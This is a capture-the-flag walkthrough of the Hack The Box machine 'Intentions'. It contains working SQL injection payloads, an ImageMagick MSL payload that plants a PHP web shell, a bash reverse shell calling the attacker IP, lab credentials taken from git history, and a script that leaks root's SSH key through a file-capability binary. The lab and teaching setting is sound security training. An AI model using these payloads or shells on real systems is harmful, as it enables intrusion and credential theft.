# HTB: Intentions - Complete Walkthrough

**Target IP:** `10.129.229.27` (active session used `10.129.11.89`)  
**Attacker IP:** `10.10.16.84`  
**OS:** Linux (Ubuntu 22.04)  
**Difficulty:** Hard

---

## Table of Contents
1. [Philosophy: The Hacker Mindset](#philosophy-the-hacker-mindset)
2. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
3. [Phase 2: Web Enumeration & Account Creation](#phase-2-web-enumeration--account-creation)
4. [Phase 3: Discovering the SQL Injection](#phase-3-discovering-the-sql-injection)
5. [Phase 4: Exploiting Second-Order SQLi](#phase-4-exploiting-second-order-sqli)
6. [Phase 5: Admin Access via v2 API](#phase-5-admin-access-via-v2-api)
7. [Phase 6: ImageMagick RCE (MSL Exploit)](#phase-6-imagemagick-rce-msl-exploit)
8. [Phase 7: Shell as www-data](#phase-7-shell-as-www-data)
9. [Phase 8: Privilege Escalation to greg](#phase-8-privilege-escalation-to-greg)
10. [Phase 9: Privilege Escalation to root](#phase-9-privilege-escalation-to-root)
11. [Lessons Learned](#lessons-learned)

---

## Philosophy: The Hacker Mindset

Before diving into commands, let's talk about **how to think** when approaching a box like this.

### Enumeration Before Exploitation
The golden rule: **You cannot exploit what you do not understand.** Every successful hack begins with painstaking observation. We map the attack surface, understand the application's logic, identify trust boundaries, and only then do we test assumptions.

### Follow the Data
Web applications are fundamentally about data flow. Ask yourself at every step:
- Where does my input go?
- When is it processed?
- Who processes it?
- What assumptions does the developer make about this data?

### The "Second-Order" Mindset
Most beginners look for immediate feedback. They input a single quote and expect an error instantly. **Second-order vulnerabilities** teach us patience—sometimes your payload is stored, sanitized, forgotten... and then dangerously reused elsewhere.

### When Plans Fail, Debug Systematically
Our ImageMagick exploit initially failed. Rather than guessing, we tested the simplest possible authenticated request first. This isolated the problem: missing session cookies. **Methodical debugging beats random guessing.**

---

## Phase 1: Reconnaissance

### Step 1.1: Port Scanning with nmap

```bash
nmap -p- --min-rate 10000 10.129.229.27
nmap -p 22,80 -sCV 10.129.229.27
```

**What we did:**
- First scan: All 65535 TCP ports at high speed (`--min-rate 10000`) to quickly identify open ports
- Second scan: Service detection (`-sCV`) on discovered ports to identify exact software versions

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

**Hacker Mindset:**
> "Two ports. SSH means we have a backup access method if we get credentials. HTTP means we have a web application to analyze. The OpenSSH version tells us this is likely Ubuntu 22.04 Jammy. Nginx 1.18.0 is standard—no obvious CVEs here. The real attack surface is the web app."

**Why this matters:**
- SSH (22) gives us a persistence/escalation path if we find credentials
- HTTP (80) is our primary target for initial access
- Version information helps us eliminate known vulnerabilities and focus on custom application logic

---

## Phase 2: Web Enumeration & Account Creation

### Step 2.1: Initial Website Exploration

Visiting `http://10.129.229.27/` shows the "Intentions Image Gallery" with a login form.

**What we did:**
1. Checked for default credentials (admin/admin, etc.) — none worked
2. Clicked "Register" and created a test account
3. Logged in and explored all features: Gallery, Your Feed, Profile

**Hacker Mindset:**
> "Every feature is a potential attack vector. I'm not looking for bugs yet—I'm building a mental model of how this application works. What data does it store? What does it display? Where does user input appear?"

### Step 2.2: Understanding the Application Logic

After logging in, we discovered three key features:

| Feature | Description | Attack Relevance |
|---------|-------------|------------------|
| **Gallery** | Shows all images by genre | Read-only, less interesting |
| **Your Feed** | Shows images matching your "Favorite Genres" | **This is where stored data gets processed dynamically** |
| **Profile** | Allows editing "Favorite Genres" (default: `food,travel,nature`) | **This is where we can store malicious input** |

**The Critical Observation:**
When we changed genres to `food,travel` and clicked Update, "Your Feed" changed. This means:
1. Our genres are **stored** in the database (Profile page)
2. They are **later retrieved** to build a SQL query (Your Feed page)

**Hacker Mindset:**
> "This is a classic second-order pattern. My input is stored in one place and used in another. If the developer builds a SQL query by inserting my genres string directly, I might be able to inject SQL."

---

## Phase 3: Discovering the SQL Injection

### Step 3.1: Testing for Injection

We tried setting Favorite Genres to: `food'`

**Result:** The profile saved successfully, but "Your Feed" returned a **500 Internal Server Error**.

**Why this is significant:**
- The save operation worked (the profile accepted the quote)
- The error only appeared when the data was **retrieved and used** in a query
- This confirms a **second-order SQL injection**

**Hacker Mindset:**
> "A first-order SQLi would error immediately on the save page. Here, the save succeeds but the read fails. This tells me the developer properly parameterized the INSERT/UPDATE but dangerously concatenated my stored value into a SELECT query elsewhere."

### Step 3.2: Understanding the Query Structure

We hypothesized the backend query looked like:
```sql
SELECT * FROM images WHERE genre IN ('food', 'travel', 'nature')
```

To inject successfully, we need to:
1. Close the opening parenthesis and quote: `')`
2. Add our malicious SQL
3. Comment out the rest with `#`

We also discovered that **spaces break the query** (likely filtered or split somewhere), so we used MySQL comment syntax `/**/` as a space substitute.

### Step 3.3: Confirming Injection

**Payload:** `food')/**/or/**/1=1#`

**Result:** "Your Feed" showed **ALL** images from every genre.

**Hacker Mindset:**
> "OR 1=1 is the classic 'show me everything' test. If this works, I own the WHERE clause. The injection is confirmed. Now I need to figure out the column count for a UNION SELECT."

---

## Phase 4: Exploiting Second-Order SQLi

### Step 4.1: Determining Column Count

**Payload:** `')/**/UNION/**/SELECT/**/1,2,3,4,5#`

**Result:** Success! We saw one image with:
- `id`: 1
- `file`: 2
- `genre`: 3
- `created_at`: timestamp
- `updated_at`: timestamp

**Why UNION SELECT needs exact columns:**
SQL requires UNION statements to have the same number of columns as the original query. If we guess wrong, we get a column mismatch error.

### Step 4.2: Database Enumeration

We used the `genre` column (position 3) to exfiltrate data since it accepts strings.

**Get database name:**
```
')/**/UNION/**/SELECT/**/1,2,database(),4,5#
```
Result: `intentions`

**Get table names:**
```
')/**/UNION/**/SELECT/**/1,2,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema='intentions'#
```

**Result:** We found the `users` table.

### Step 4.3: Dumping User Credentials

**Final Payload:**
```
')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password),4,5/**/from/**/users#
```

**Result:** We extracted all users including admins:

```
steve:steve@intentions.htb:1:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
greg:greg@intentions.htb:1:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
```

**Key Observations:**
- `admin=1` indicates admin privileges
- Passwords are bcrypt hashes (`$2y$10$...`)
- Bcrypt is computationally expensive to crack—brute-forcing would take days/weeks

**Hacker Mindset:**
> "I have hashes, but bcrypt is designed to resist brute-force. Hashcat would struggle here. I need to find another way to use these hashes. Maybe the application itself can authenticate with them?"

---

## Phase 5: Admin Access via v2 API

### Step 5.1: Discovering the v2 Login Endpoint

Exploring JavaScript files (specifically `admin.js`) revealed that a **v2 API** exists with client-side password hashing. The v2 login uses `email` and `hash` instead of `password`.

**Why this exists:**
The developers mistakenly believed that sending bcrypt hashes instead of plaintext passwords was "more secure"—not realizing that **if you have the hash, you have the password** from the server's perspective.

### Step 5.2: Authenticating as Steve

```bash
curl -s -X POST http://10.129.11.89/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"steve@intentions.htb","hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}'
```

**Result:** We received a JWT token.

**Hacker Mindset:**
> "This is a critical logic flaw. The developers confused 'not sending plaintext' with 'secure authentication.' A hash is just a delegated password. If the server accepts the hash as proof of identity, then leaking the hash is equivalent to leaking the password."

### Step 5.3: Establishing a Session

**The Problem:** The JWT token alone wasn't enough for web/API access. The application also required session cookies (`intentions_session`, `XSRF-TOKEN`).

**Solution:** We established a full session by:
1. Visiting the homepage to get base cookies
2. Sending those cookies during v2 login
3. Saving the resulting cookie jar

```bash
curl -s -c /tmp/htb_cookies.txt http://10.129.11.89/ > /dev/null
curl -s -i -X POST http://10.129.11.89/api/v2/auth/login \
  -H "Content-Type: application/json" \
  -b /tmp/htb_cookies.txt \
  -c /tmp/htb_cookies.txt \
  -d '{"email":"steve@intentions.htb","hash":"$2y$10$..."}'
```

**Hacker Mindset:**
> "When authentication fails, don't assume the token is invalid. Modern web apps often use multiple authentication mechanisms simultaneously—JWTs for API state, session cookies for web state, CSRF tokens for form security. I needed the complete authentication package."

---

## Phase 6: ImageMagick RCE (MSL Exploit)

### Step 6.1: Discovering the Admin Feature

As admin, we accessed `/admin` and found an image editing feature. Clicking "Edit" on an image showed effect buttons (CHARCOAL, etc.).

**The API call:**
```json
POST /api/v2/admin/image/modify
{"path":"/var/www/html/intentions/storage/app/public/food/rod-long--LMw-y4gxac-unsplash.jpg","effect":"charcoal"}
```

**Hacker Mindset:**
> "Anytime an application reads a file path that I control, I ask: Can I read other files? Can I write files? What library handles this? The path parameter is a golden opportunity."

### Step 6.2: Identifying ImageMagick

We confirmed ImageMagick by:
1. Testing `path[100x100]` — worked (resized)
2. Testing `path[]` — failed
3. Testing `path[10x10]` — worked (tiny image)

This bracket syntax is **unique to ImageMagick**.

### Step 6.3: Understanding the Vulnerability

ImageMagick's PHP extension (`Imagick`) allows **arbitrary object instantiation**. When you pass a specially crafted path to `new Imagick()`, it can:
- Read from URLs (`http://`, `ftp://`)
- Process MSL (Magick Scripting Language) files
- Write files to arbitrary locations

**The MSL format** is an XML-based scripting language for ImageMagick that can:
- Read images (including from URLs)
- Write images (to arbitrary paths)
- Embed PHP code in captions

### Step 6.4: The Exploit Chain

**Problem:** We can't directly upload an MSL file and reference it because `msl:/http://attacker/` isn't supported.

**Solution:** We abuse PHP's temporary file handling:
1. Send a multipart POST request with the MSL file as an attachment
2. PHP saves it to `/tmp/phpXXXXXX` (random suffix)
3. Use the `vid:` scheme with wildcards: `vid:msl:/tmp/php*`
4. ImageMagick's `ExpandFilenames` finds the temp file via wildcard matching

### Step 6.5: Creating the Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/shell.php" />
</image>
```

**Why this works:**
- `caption:` creates an image containing the text `<?php system($_REQUEST['cmd']); ?>`
- `info:` writes image metadata/info to the specified path
- The resulting file contains PHP code that executes when accessed via the web server
- The `caption:` text before the PHP tag appears in output (hence the `caption:` prefix we saw)

### Step 6.6: Executing the Exploit

```bash
curl -X POST "http://10.129.11.89/api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd" \
  -b /tmp/htb_cookies.txt \
  -F 'file=@/tmp/shell.msl;filename=test.msl'
```

**Result:** 502 Bad Gateway (ImageMagick crashed processing the MSL—this is expected and means success)

**Verification:**
```bash
curl -s "http://10.129.11.89/storage/shell.php?cmd=id"
# Output: caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Hacker Mindset:**
> "A 502 error from nginx often means the backend PHP process crashed or timed out. In exploit development, a crash can be a sign of success—especially when dealing with complex parsers like ImageMagick. Always verify by checking if your payload artifact exists."

---

## Phase 7: Shell as www-data

### Step 7.1: Getting the Reverse Shell

```bash
nc -lnvp 443  # On Kali

curl -s "http://10.129.11.89/storage/shell.php" \
  -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.84/443 0>%261"'
```

**Critical detail:** The `%26` is URL-encoded `&`. Without this, PHP's `system()` would receive a broken command because `&` is a form data delimiter.

**Result:** We caught a shell as `www-data`.

### Step 7.2: Upgrading the Shell

```bash
# In the reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Why upgrade?** A basic netcat shell lacks job control, proper signal handling, and TTY features. A pseudo-TTY gives us a more stable interactive environment.

---

## Phase 8: Privilege Escalation to greg

### Step 8.1: Finding the Git Repository

```bash
cd /var/www/html/intentions
ls -la  # Reveals .git directory
```

**Hacker Mindset:**
> "Git repositories in production are gold mines. Developers often commit sensitive data—passwords, API keys, configuration files—and then 'remove' them in later commits. But Git remembers everything."

### Step 8.2: Extracting Credentials from Git History

We encountered a permission issue: Git refused to run due to "dubious ownership." We bypassed this by setting `HOME=/tmp` so Git could write its config.

```bash
HOME=/tmp git config --global --add safe.directory /var/www/html/intentions
HOME=/tmp git --no-pager log --oneline
HOME=/tmp git --no-pager show 36b4287:tests/Feature/Helper.php
```

**Result:**
```php
$res = $test->postJson('/api/v1/auth/login', 
  ['email' => 'greg@intentions.htb', 
   'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
```

**Hacker Mindset:**
> "This is why you check Git history. The password was removed in a later commit (`f7c903a`), but it lives forever in commit `36b4287`. Always use `--no-pager` when dealing with limited terminals."

### Step 8.3: Pivoting to greg

```bash
su - greg
# Password: Gr3g1sTh3B3stDev3l0per!1998!
```

---

## Phase 9: Privilege Escalation to root

### Step 9.1: Enumeration as greg

```bash
sudo -l  # No sudo access
find / -perm -4000 -or -perm -2000 2>/dev/null  # No unusual SUID binaries
getcap -r / 2>/dev/null
```

**Critical Discovery:**
```
/opt/scanner/scanner cap_dac_read_search=ep
```

**What `cap_dac_read_search=ep` means:**
This Linux capability allows the binary to **bypass all file read permission checks**. It can read `/root/.ssh/id_rsa`, `/etc/shadow`, or any file regardless of ownership or permissions.

**Hacker Mindset:**
> "Capabilities are the silent privilege escalators of modern Linux. They grant specific superuser powers without granting full root access. CAP_DAC_READ_SEARCH is basically 'read any file.' If I can abuse the binary's functionality to leak file contents, I win."

### Step 9.2: Understanding the Scanner Binary

The scanner computes MD5 hashes of files and compares them against a blacklist. The key flag is `-l`:

```
-l int  Maximum bytes of files being checked to hash (default 500)
```

With `-p` (print debug), it reveals the hash of the first N bytes.

### Step 9.3: The Brute-Force Strategy

**The Insight:**
If we know the MD5 hash of the first byte of a file, we can brute-force all 256 possible byte values to find the match. Then we do the same for the first 2 bytes, 3 bytes, etc.

**Why this works:**
- MD5 is deterministic: same input = same hash
- We can control the length with `-l`
- We can read any file with the capability

### Step 9.4: The Exploit Script

```python
#!/usr/bin/env python3
import hashlib
import subprocess
import sys

def get_hash(fn, n):
    proc = subprocess.run(f"/opt/scanner/scanner -c {fn} -s whatever -p -l {n}".split(),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        return proc.stdout.decode().strip().split()[-1]
    except IndexError:
        return None

def get_next_char(output, target):
    for i in range(256):
        if target == hashlib.md5(output + chr(i).encode()).hexdigest():
            return chr(i).encode()

output = b""
fn = sys.argv[1]

while True:
    target = get_hash(fn, len(output) + 1)
    next_char = get_next_char(output, target)
    if next_char is None:
        break
    output += next_char
    print(next_char.decode(), end="", flush=True)

print()
```

### Step 9.5: Reading root's SSH Key

```bash
python3 /tmp/read_file.py /root/.ssh/id_rsa
```

**Result:** After several minutes of brute-forcing byte-by-byte, we recovered the complete private key.

**Hacker Mindset:**
> "This is a 'lame' exploit in the best way possible. No memory corruption, no fancy technique—just abusing the intended functionality of a privileged binary. When you have arbitrary read, the game is over. I chose `/root/.ssh/id_rsa` because it's the cleanest, most reliable persistence method."

### Step 9.6: SSH as root

On Kali, we saved the key to `root_key`, set proper permissions, and connected:

```bash
chmod 600 root_key
ssh -i root_key root@10.129.11.89
```

**Result:** Root shell achieved.

---

## Lessons Learned

### For Attackers
1. **Second-order vulnerabilities** require patience. Test inputs in all contexts where stored data is reused.
2. **Hashes are passwords.** Never assume hashed credentials are safe to expose.
3. **Capabilities are privileges.** Always check `getcap` during Linux enumeration.
4. **Git history is sensitive.** Never commit credentials, but also always check `.git` in target environments.
5. **Debug systematically.** When the MSL exploit failed, we tested a simple authenticated request first to isolate the auth issue.

### For Defenders
1. **Parameterize ALL queries.** The SQLi existed because the genres string was concatenated into a SELECT statement while INSERTs were likely parameterized.
2. **Don't accept hashes as passwords.** Client-side hashing doesn't improve security if the server accepts the hash.
3. **Sanitize file paths rigorously.** Never pass user-controlled paths directly to image processing libraries.
4. **Audit capabilities.** `cap_dac_read_search` on a user-accessible binary is equivalent to giving away root's reading ability.
5. **Scrub Git history.** Use `git filter-repo` or BFG to permanently remove secrets from history.

---

## Flags

- **User Flag:** `741c7b00[redacted]6731bff4`
- **Root Flag:** `eeb7a2[redacted]279b9bb2`

---

*Happy Hacking!* 
